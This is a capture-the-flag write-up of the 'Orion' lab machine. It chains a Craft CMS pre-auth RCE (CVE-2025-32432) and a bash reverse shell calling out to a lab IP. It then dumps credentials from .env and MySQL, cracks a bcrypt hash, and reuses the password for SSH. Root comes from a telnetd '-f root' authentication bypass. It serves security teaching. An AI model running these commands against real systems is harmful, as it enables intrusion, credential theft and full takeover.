## Machine Summary

**Orion** is a Linux machine simulating a telecom infrastructure company (Orion Telecom), demonstrating a multi-stage attack chain involving:
- **Web enumeration** revealing a Craft CMS installation on a virtual host
- **Unauthenticated RCE** via CVE-2025-32432 (Craft CMS) built on the underlying Yii2 flaw CVE-2024-58136
- **Credential harvesting** from an exposed `.env` file and the Craft `users` table
- **Bcrypt hash cracking** and credential reuse to pivot to a system user over SSH
- **Root via an authentication bypass** in GNU Inetutils telnetd (CVE-2026-24061), abusing an internal service bound to localhost

## Enumeration

### Initial Nmap Scan

```bash
nmap -p- --min-rate=5000 -T4 -Pn 10.129.98.166
```

**Results:**
```
22/tcp   open  ssh
80/tcp   open  http
```

### Deep Service Enumeration

```bash
nmap -p22,80 -sCV -T4 --min-rate 4000 10.129.98.166
```

**Key Findings:**
- **Port 22**: OpenSSH 8.9p1 Ubuntu (Ubuntu 22.04 Jammy)
- **Port 80**: nginx 1.18.0 (Ubuntu) — redirects to `http://orion.htb/`

Add virtual host to `/etc/hosts`:
```bash
echo "10.129.98.166 orion.htb" | sudo tee -a /etc/hosts
```

The site (`Orion Telecom`) fingerprints as **Craft CMS** running on the **Yii Framework**, served by nginx. Checking the admin login page source revealed the exact version:

## Exploitation

### Phase 1: Version Correlation → CVE Identification

Craft CMS 5.6.16 and Yii 2.0.51 correlate directly to a known vulnerability chain:

- **CVE-2024-58136**: input validation flaw in Yii2 core (≤ 2.0.51) around unsafe attaching of behaviors via `__class`.
- **CVE-2025-32432**: the same root cause exploited pre-authentication in Craft CMS (3.x, 4.x, and 5.x < 5.6.17) via the `assets/generate-transform` endpoint, chaining a Yii deserialization gadget (`FieldLayoutBehavior` → `PhpManager`) with PHP session poisoning to achieve RCE.

### Phase 2: Unauthenticated RCE → Shell as `www-data`

Using a public PoC for CVE-2025-32432:

```bash
git clone https://github.com/theeomega/CVE-2025-32432-POC.git
cd CVE-2025-32432-POC
python3 exploit.py -u http://orion.htb -c 'id'
```

With command execution confirmed, a detached reverse shell was triggered to avoid the connection dying when the underlying PHP request completed:

```bash
python3 exploit.py -u http://orion.htb -c "bash -c 'setsid nohup bash -c \"bash -i >& /dev/tcp/10.10.14.188/4444 0>&1\" &'"
```

**Result:** Reverse shell as `www-data`.

### Phase 3: Credential Harvesting → SSH as `adam`

#### Exposed `.env` File

```bash
cat ~/html/craft/.env
```

```
CRAFT_DB_DRIVER=mysql
CRAFT_DB_SERVER=127.0.0.1
CRAFT_DB_DATABASE=orion
CRAFT_DB_USER=root
CRAFT_DB_PASSWORD=SuperSecureCraft123Pass!
```

#### Dumping the Craft Users Table

```bash
mysql -h 127.0.0.1 -u root -p'SuperSecureCraft123Pass!' -D orion -e "SELECT * FROM users;"
```

```
admin | adam@orion.htb | $2y$13$e9zuohgFZzGtbQalcn9Mz.5PJbjxobO0GMbXo8NHp3P/B42LUg0lS
```

The admin email (`adam@orion.htb`) hinted at a matching system username.

#### Bcrypt Hash Cracking

```bash
echo '$2y$13$e9zuohgFZzGtbQalcn9Mz.5PJbjxobO0GMbXo8NHp3P/B42LUg0lS' > admin_hash.txt
john --format=bcrypt --wordlist=/usr/share/wordlists/rockyou.txt admin_hash.txt
```

**Result:** `admin:darkangel`

#### Credential Reuse → SSH

```bash
ssh adam@orion.htb
# Password: darkangel
```

**User flag obtained.**

### Phase 4: Privilege Escalation → `root`

#### Internal Service Discovery

```bash
ss -tulnp
```

```
tcp  LISTEN  0  10  127.0.0.1:23  0.0.0.0:*
```

A Telnet service was found bound only to `localhost`, running **GNU Inetutils 2.7**:

```bash
telnet --version
```

```
telnet (GNU inetutils) 2.7
```

#### Vulnerability Analysis

**CVE-2026-24061** is a critical authentication bypass (CVSS 9.8) in GNU Inetutils telnetd (versions 1.9.3–2.7). The daemon forwards the Telnet `USER` environment variable (negotiated via `NEW-ENVIRON`, RFC 1572) unsanitized as an argument to `/usr/bin/login`. Supplying `USER=-f root` causes `login` to interpret `-f` as its "already authenticated" flag, granting an instant root session with zero credentials.

#### Exploitation

The vulnerable client shipped on the box was enough to exploit the local service directly — no external tooling required:

```bash
telnet -l "-f root" 127.0.0.1
```

**Result:** Root shell obtained.

```bash
cat /root/root.txt
```

**Root flag obtained.**

## Key Takeaways

1. **Version disclosure** on login pages and `robots.txt` can directly hand attackers the exact CVE to chain.
2. **Framework-level vulnerabilities** (Yii2) can silently propagate into every product built on top of them (Craft CMS).
3. **`.env` files** left readable by the web user are a direct path to database credentials.
4. **Credential and identity reuse** (CMS email → system username, CMS password → SSH) remains one of the most reliable pivots.
5. **Internal-only services** (bound to `127.0.0.1`) are not "safe by obscurity" — once you have a foothold, they're part of the attack surface.
6. **Legacy protocols like Telnet** can hide decade-old, trivially exploitable bugs that grant instant root.
